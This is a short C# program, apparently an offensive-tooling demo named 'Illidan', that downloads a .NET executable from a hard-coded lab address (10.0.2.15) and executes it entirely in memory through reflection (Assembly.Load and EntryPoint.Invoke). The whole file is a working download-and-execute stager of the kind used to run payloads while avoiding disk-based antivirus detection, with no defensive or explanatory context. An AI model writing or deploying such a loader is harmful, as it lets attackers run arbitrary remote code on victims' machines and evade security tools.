using System;
using System.Net;
using System.Reflection;

namespace Illidan
{
    class Program
    {
        static void ReflectFromWeb(string url)
        {
            WebClient client = new WebClient();
            byte[] programBytes = client.DownloadData(url);
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
        static void Main(string[] args)
        {
            ReflectFromWeb("http://10.0.2.15/HelloReflectionWorld.exe");
        }
    }
}
